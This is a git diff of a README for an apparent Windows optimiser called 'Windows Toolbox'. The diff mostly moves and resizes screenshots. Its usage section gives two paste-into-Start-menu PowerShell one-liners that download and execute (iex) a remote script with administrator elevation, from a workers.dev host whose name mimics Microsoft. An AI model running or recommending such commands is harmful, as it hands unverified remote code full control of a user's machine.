@@ -40,17 +40,20 @@ Before doing anything, Create a "System Restore Point" from Windows Toolbox. jus
 # How to use
 Copy the follow command and paste it in the startmenu serach bar then hit enter <br />
 
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="text" width="500"> <br />
+
+
 Graphical user Interface (GUI)<br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
 
 Command line Interface (CLI)<br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://pstool.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
 
+ <br />
 
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="text" width="500">
 
 
 <p float="left">
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="text" width="550">
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Optimizer.png" alt="text" width="550">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="text" width="500">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Optimizer.png" alt="text" width="500">
 </p>
